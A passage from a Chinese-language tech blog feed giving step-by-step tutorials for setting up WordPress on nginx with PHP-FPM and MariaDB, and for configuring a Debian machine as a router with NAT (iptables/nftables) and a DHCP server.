解壓縮</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf latest-zh_TW.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 新建網站的根目錄，sitename可以是網站的網址或任何你喜歡的名字，後面按需替換</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /var/www/sitename</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mv</span> wordpress/* /var/www/sitename/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 更改權限</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chown</span> -R www-data:www-data /var/www/sitename</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> -R 755 /var/www/sitename</span><br></code></pre></td></tr></table></figure><h2 id="Database配置">Database配置</h2><p>使用root執行<code>mysql_secure_installation</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mysql_secure_installation</span><br></code></pre></td></tr></table></figure><p>跟著引導安裝即可，說明很完全</p><hr><p>執行<code>mysql</code>，進入Database</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 可以使用其他的名稱來命名Database，這裡以wordpress作為範例，如果改名後面也要更改<br>MariaDB [(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> DATABASE wordpress;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.002</span> sec)<br><br># 新建wpuser的帳戶，密碼為passwd，可以存取wordpress的所有權限，可以用其他用戶名和密碼，待會會使用到<br>MariaDB [(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> wordpress.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> &quot;wpuser&quot;@&quot;localhost&quot; IDENTIFIED <span class="hljs-keyword">BY</span> &quot;passwd&quot;;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.008</span> sec)<br><br># 應用<br>MariaDB [(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span> FLUSH PRIVILEGES;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.003</span> sec)<br><br>MariaDB [(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span> exit<br>Bye<br></code></pre></td></tr></table></figure><h2 id="網頁設定">網頁設定</h2><h3 id="php">php</h3><p>編輯<code>/etc/php/8.2/fpm/php.ini</code>，搜尋這三個設定並更改，如果php版本較高，記得更改對應的位置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cgi.fix_pathinfo</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">upload_max_filesize</span> = <span class="hljs-number">256</span>M<br><span class="hljs-attr">post_max_size</span> = <span class="hljs-number">256</span>M<br></code></pre></td></tr></table></figure><p>編輯<code>/etc/php/8.2/fpm/pool.d/www.conf</code>，這些應該是預設值，確認一樣即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs conf">listen = /run/php/php8.2-fpm.sock<br>user = www-data<br>group = www-data<br></code></pre></td></tr></table></figure><p>重啟<code>php-fpm</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now php8.2-fpm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl restart php8.2-fpm</span><br></code></pre></td></tr></table></figure><h3 id="nginx">nginx</h3><p>編輯<code>/etc/nginx/nginx.conf</code>，修改對應的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs conf">event&#123;<br>    worker_connections 1024;<br>    use epoll;<br>    multi_accept on;<br>&#125;<br>http&#123;<br>    server_tokens off;<br>    client_max_body_size 256M;<br>&#125;<br></code></pre></td></tr></table></figure><p>編輯<code>/etc/nginx/fastcgi_params</code>，在最後加上設定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs conf">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br></code></pre></td></tr></table></figure><p>新增<code>/etc/nginx/sites-available/wordpress</code>，編輯virtual server設定，這個設定為http站點，且設定為default_server，可依照自己需求進行更改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs conf">server &#123;<br>        listen 80 default_server;<br>        ## Your website name goes here.<br>        # server_name example.com;<br>        ## Your only path reference.<br>        root /var/www/sitename;<br>        ## This should be in your http block and if it is, it&#x27;s not needed here.<br>        index index.php;<br><br>        client_max_body_size 512M;<br><br>        # log<br>        access_log /var/log/nginx/wordpress/access.log;<br>        error_log /var/log/nginx/wordpress/error.log;<br><br>        location = /favicon.ico &#123;<br>                log_not_found off;<br>                access_log off;<br>        &#125;<br><br>        location = /robots.txt &#123;<br>                allow all;<br>                log_not_found off;<br>                access_log off;<br>        &#125;<br><br>        location / &#123;<br>                # This is cool because no php is touched for static content.<br>                # include the &quot;?$args&quot; part so non-default permalinks doesn&#x27;t break when using query string<br>                try_files $uri $uri/ /index.php?$args;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>                #NOTE: You should have &quot;cgi.fix_pathinfo = 0;&quot; in php.ini<br>                include fastcgi_params;<br>                fastcgi_intercept_errors on;<br>                fastcgi_pass unix:/run/php/php-fpm.sock;<br>                #The following parameter can be also included in fastcgi_params file<br>                fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;<br>        &#125;<br><br>        location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ &#123;<br>                expires max;<br>                log_not_found off;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最後將站點啟用並重啟nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 創建設定檔中log的放置資料夾</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /var/log/nginx/wordpress/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 啟用站點</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">ln</span> -s /etc/nginx/sites-available/wordpress /etc/nginx/sites-enabled/wordpress</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 刪除預設站點</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">rm</span> /etc/nginx/sites-enabled/default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 測試設定檔是否正確，應該是不會報錯</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nginx -t</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 啟用服務</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 重啟nginx</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nginx -s reload</span><br><br></code></pre></td></tr></table></figure><h2 id="WordPress安裝">WordPress安裝</h2><p>在完成前面的設定後使用瀏覽器打開你架設WordPress服務器的IP，應該會看到這個頁面</p><p><img src="wordpress1.png" alt=""></p><p>接下來就跟著導引安裝即可</p><p>資料庫名稱使用剛剛Database設定部分資料庫的名字，帳號和密碼同樣也是按照設定的填</p><p><img src="wordpress2.png" alt=""></p><p>如果都沒填錯，那麼應該就會看到這個畫面，執行安裝即可</p><p><img src="wordpress3.png" alt=""></p><p>接下來就是WordPress站點的設定，同樣也是自己按需填寫即可，這邊填的都是範例資料</p><p><img src="wordpress4.png" alt=""></p><p>這樣就完成WordPress的安裝了，登入即可開始Wordpress網站的設定</p><p><img src="wordpress5.png" alt=""></p><p><img src="wordpress6.png" alt=""></p><p><img src="wordpress7.png" alt=""></p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.digitalocean.com/community/tutorials/install-wordpress-nginx-ubuntu">Install WordPress with Nginx on Ubuntu 18.04 | DigitalOcean</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://developer.wordpress.org/advanced-administration/before-install/creating-database/">Creating Database for WordPress – Advanced Administration Handbook | Developer.WordPress.org</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://developer.wordpress.org/advanced-administration/wordpress/wp-config/">Editing wp-config.php – Advanced Administration Handbook | Developer.WordPress.org</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://footmark.com.tw/news/web-design/wordpress/nginx-php-fpm-wordpress-centos8/">NGINX 搭配 PHP-FPM 配置 WordPress 多站點網站 for CentOS 8 - 腳印網頁資訊設計</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://shazi.info/%E7%94%A8-nginx-%E4%BE%86%E5%AE%89%E8%A3%9D-wordpress-%E6%94%B9%E7%94%A8-lnmp-%E5%8F%96%E4%BB%A3-apache-%E5%90%A7/">用 Nginx 取代 Apache 吧 – WordPress 實務操作 Round1 – Mr. 沙先生</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://tec.xenby.com/20-nginx-%E8%88%87-php-fpm-%E9%81%8B%E4%BD%9C%E4%BB%8B%E7%B4%B9%E8%88%87%E8%A8%AD%E5%AE%9A%E8%AC%9B%E8%A7%A3">[講解] nginx 與 php-fpm 運作介紹與設定 | 辛比記</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://medium.com/dean-lin/%E8%AA%BF%E6%95%B4-php-fpm-nginx-%E5%8F%83%E6%95%B8%E4%BE%86%E5%B0%8D%E6%8A%97%E5%A4%A7%E6%B5%81%E9%87%8F%E6%83%85%E5%A2%83-b465a913ee07">調整 php-fpm &amp; nginx 參數，讓 Server 可以承受更大的流量 | by 林鼎淵 | Dean Lin | Medium</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>linux</tag>
      
      <tag>nginx</tag>
      
      <tag>wordpress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置linux做為router</title>
    <link href="/turning-linux-into-a-router/"/>
    <url>/turning-linux-into-a-router/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>2024/8/18更新： 更新nftables的操作說明及進階設定：使用Wireguard建立Site to Site Tunnel</p>          </div><h1 id="前言">前言</h1><p>在更換主路由為VyOS的一段時間後，我突然想嘗試使用linux直接手動設定router的功能，藉此達成更靈活的設定，因此有了這篇記錄。</p><h1 id="基本設定">基本設定</h1><p>在以下設定中eth0代表wan接廣域網路，eth1～n代表lan接內部網，內部網路10.0.0.0/24，gateway: 10.0.0.254</p><p>使用的linux distro為debian，netinst最小安裝</p><h2 id="安裝">安裝</h2><p>這個應該不用教吧。 =_=</p><h2 id="SSH及權限設定">SSH及權限設定</h2><h3 id="SSH">SSH</h3><p>因為這台機器接觸廣域網路，最好限制SSH的登入設定</p><p><code>/etc/ssh/sshd_config</code>，自行替換&lt;username&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs conf">AllowUsers &lt;username&gt;<br></code></pre></td></tr></table></figure><h3 id="sudo">sudo</h3><p>更新並安裝sudo，讓管理帳戶允許使用sudo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">apt update</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">apt upgrade</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">apt install sudo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">usermod -aG sudo &lt;username&gt;</span><br></code></pre></td></tr></table></figure><h2 id="設定網路介面">設定網路介面</h2><p>編輯<code>/etc/network/interface</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs conf"># 應該都會有這段<br># The loopback network interface<br>auto lo<br>iface lo inet loopback<br><br># 安裝時如果有設定網路應該有這段，刪掉或註解掉<br># allow-hotplug eth0<br># iface eth0 inet dhcp<br><br># 重新命名介面名稱，可不做，方便辨認而已<br>rename eth0=wan<br>rename eth1=lan<br><br># 配置使用auto，自動啟動介面，而非有接入才啟動，如果有重命名，需使用重命名的接口名稱<br>auto wan<br># 如果wan是dhcp<br>iface wan inet dhcp<br># 如果是手動設IP<br># iface wan inet static<br>#     address x.x.x.x/x<br>#     gateway x.x.x.x<br># 如果是pppoe撥號，參考https://wiki.debian.org/PPPoE<br><br>auto lan<br>iface lan inet static<br># 不用設gateway，這是和lan通訊的介面<br>    address 10.0.0.254/24<br></code></pre></td></tr></table></figure><p>重啟<code>networking.service</code>應用設定，或是直接重開機(改介面名稱可能導致重啟<code>networking.service</code>失敗，可以用重開機解決)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># systemctl restart networking.service</span><br></code></pre></td></tr></table></figure><h3 id="DNS">DNS</h3><p>一般我不希望router上的dns受到其他因素影響而變動，像是DHCP之類的</p><p>可以在設定完<code>/etc/resolv.conf</code>後直接鎖死這個檔案的編輯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">chattr +i /etc/resolv.conf</span><br></code></pre></td></tr></table></figure><p>如果不想看到DHCP client報錯，可以讓DHCP client不更改<code>/etc/resolv.conf</code></p><p>編輯新檔案<code>/etc/dhcp/dhclient-enter-hooks.d/nodnsupdate</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs conf">#!/bin/sh<br><br>make_resolv_conf()&#123;<br>        :<br>&#125;<br></code></pre></td></tr></table></figure><p>覆蓋掉更新dns的部分則不會更新dns</p><p>並加上執行權限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x /etc/dhcp/dhclient-enter-hooks.d/nodnsupdate</span><br></code></pre></td></tr></table></figure><h2 id="NAT">NAT</h2><p>接下來有關防火牆的部分可以使用<code>iptables</code>亦或是<code>nft</code>來進行設定，不過現在iptables-nft後端同樣是hook nft，在少量規則的情況下並不會有太大的性能差異，如果不想學習nft可以使用iptables設定即可。</p><p>不管使用哪個工具都必須先開啟轉發鏈，編輯<code>/etc/sysctl.conf</code>，找到<code>net.ipv4.ip_forward=1</code>取消註解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs conf"># Uncomment the next line to enable packet forwarding for IPv4<br>net.ipv4.ip_forward=1<br></code></pre></td></tr></table></figure><p>應用配置，或是直接重開也會自動應用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sysctl -p</span><br></code></pre></td></tr></table></figure><h3 id="iptables">iptables</h3><p>安裝iptables及儲存iptables設定的工具(iptables-persistent是debian系的工具，RedHat系好像是用其他工具)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">apt install iptables iptables-persistent</span><br></code></pre></td></tr></table></figure><p>新增nat規則</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">iptables -A POSTROUTING -t nat -s 10.0.0.0/24 -o wan -j MASQUERADE</span><br></code></pre></td></tr></table></figure><p>如果wan和lan的介面MTU不同，最好加上mss clamping</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">iptables -A FORWARD -t mangle -p tcp -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu</span><br></code></pre></td></tr></table></figure><hr><p>儲存配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">iptables-save &gt; /etc/iptables/rules.v4</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> iptables.service</span><br></code></pre></td></tr></table></figure><p>記得編輯<code>/etc/iptables/rules.v4</code>中的封包計數，讓其歸零</p><p>以filter表的部分舉例，將[x:x]中的x都改為0，其他幾個表也相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs conf">*filter<br>:INPUT ACCEPT [0:0]<br>:FORWARD DROP [0:0]<br>:OUTPUT ACCEPT [0:0]<br>...<br>COMMIT<br></code></pre></td></tr></table></figure><hr><p>應用設定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">iptables-restore /etc/iptables/rules.v4</span><br></code></pre></td></tr></table></figure><p>未來想更改設定，可以直接編輯<code>/etc/iptables/rules.v4</code>，語法和iptables相同，只是不用加iptables，也不用加<code>-t 表名</code> 只要將配置增加到對應表的部分內即可</p><p>如果不知道怎麼寫<code>rules.v4</code>也可以直接使用iptables新增規則，在直接執行<code>iptables-save</code>複製輸出新增的部分到<code>rules.v4</code>中</p><h3 id="nftables">nftables</h3><p>安裝nftables</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">apt install nftables</span><br></code></pre></td></tr></table></figure><p>nftables預設沒有任何表或鏈，可以用<code>nft list ruleset</code>查看目前的防火牆狀態，應該是不會看到任何東西輸出</p><h4 id="簡易介紹">簡易介紹</h4><p>nftables的結構是tables-chains-rules三層，可以這樣新增一個表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">nft add table inet filter</span><br></code></pre></td></tr></table></figure><p>inet是table的family，可以同時包含ipv4或ipv6，也可以使用ip作為family，不過這樣就和iptables一樣了，其他family可以參考<a href="https://wiki.nftables.org/wiki-nftables/index.php/Nftables_families">這裡</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Nftables families - nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Nftables_families)">[1]</span></a></sup></p><hr><p>可以這樣新增位於filter底下的鏈</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">nft add chain inet filter INPUT [ &#123; <span class="hljs-built_in">type</span> filter hook input priority filter; policy accept;  &#125; ]</span><br></code></pre></td></tr></table></figure><p>這邊的參數比較多，可以參考<a href="https://wiki.nftables.org/wiki-nftables/index.php/Configuring_chains">wiki的說明</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Configuring chains - nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Configuring_chains)">[2]</span></a></sup>，要注意的是預設的policy和type要在創建時就指定，不然想要改只能刪掉鏈重新創建</p><hr><p>可以這樣創建位於INPUT鏈底下的規則</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">nft add rule inet filter INPUT &lt;match&gt; &lt;statements&gt;</span><br></code></pre></td></tr></table></figure><p>match和stataement和iptables的概念類似，就是匹配，然後決定行為，詳細可以看<a href="https://wiki.nftables.org/wiki-nftables/index.php/Simple_rule_management">wiki的說明</a><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Simple rule management - nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Simple_rule_management)">[3]</span></a></sup></p><hr><p>簡易的介紹大概這樣，更詳細的可以直接看<a href="https://wiki.nftables.org/wiki-nftables/index.php/Main_Page">wiki</a><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page)">[4]</span></a></sup></p><h4 id="NAT的設定">NAT的設定</h4><p>雖然可以打指令來配置防火牆，但是編輯設定檔再來直接應用我覺得更加好理解及方便，因此設定會直接編輯設定檔</p><p>編輯<code>/etc/nftables.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs conf">#!/usr/sbin/nft -f<br><br>flush ruleset<br><br>table inet mangle &#123;<br>        chain FORWARD &#123;<br>                type filter hook forward priority mangle; policy accept;<br>                tcp flags syn tcp option maxseg size set rt mtu<br>        &#125;<br>&#125;<br>table inet nat &#123;<br>        chain POSTROUTING &#123;<br>                type nat hook postrouting priority srcnat; policy accept;<br>                oifname &quot;wan&quot; ip saddr 10.0.0.0/24 masquerade<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最上面的兩行代表使用nft來執行設定檔的腳本還有清空nftables的規則，nftables的一個優點是Atomic Rule Replacement，可以讓規則在更換時不會像iptables-restore之類的腳本出現一瞬間沒有防火牆的漏洞</p><p>table nat設定了POSTROUTING鏈，裡面的規則和前面iptables設定的相同，都是執行masquerade，不過我把counter這個statements取消了，反正我也不會去看計數器</p><p>table mangle則是設定了MSS Clamping的規則，同前面的iptables</p><hr><p>應用設定直接執行<code>/etc/nftables.conf</code>即可，啟動nftables服務可以在開機時回復防火牆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/nftables.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> nftables.service</span><br></code></pre></td></tr></table></figure><h2 id="DHCP-server">DHCP server</h2><p>安裝<code>isc-dhcp-server</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">apt install isc-dhcp-server</span><br></code></pre></td></tr></table></figure><p>編輯<code>/etc/default/isc-dhcp-server</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs conf">INTERFACESv4=&quot;lan&quot;<br></code></pre></td></tr></table></figure><p>在雙引號中加入內部網路使用的介面，如果有多個，使用空格分隔</p><p>編輯<code>/etc/dhcp/dhcpd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs conf"># 檔案最前面的option、default-lease-time和max-lease-time可動可不動<br># 我一般會修改max-lease-time到86400，不過這些設定可以被subnet區域的設定覆蓋<br># 將authoritative;取消註解<br>authoritative;<br><br># 新增一個subnet，subnet和netmask使用子網對應的值<br>subnet 10.0.0.0 netmask 255.255.255.0 &#123;<br>    # 發的IP範圍<br>    range 10.0.0.2 10.0.0.99;<br>    # 可設可不設<br>    option domain-name &quot;example.com&quot;;<br>    # 指定DHCP分配的DNS<br>    option domain-name-servers 1.1.1.1;<br>    # 網關<br>    option routers 10.0.0.254;<br>    # 好像可加可不加？<br>    option broadcast-address 10.0.0.255;<br>    default-lease-time 3600;<br>    max-lease-time 86400;<br>&#125;<br><br># 如果想做static DHCP可以新增host區段<br>host example-device &#123;<br>    # mac位置，也可以用其他方式匹配客戶端，<br>    hardware ethernet e8:65:d4:67:1f:68;<br>    # 可以配發前面range以外的IP<br>    fixed-address 10.0.0.101;<br>&#125;<br></code></pre></td></tr></table></figure><p>基本上設定檔本身就有做教學了，可以直接跟著設定檔做</p><h2 id="防火牆">防火牆</h2><h3 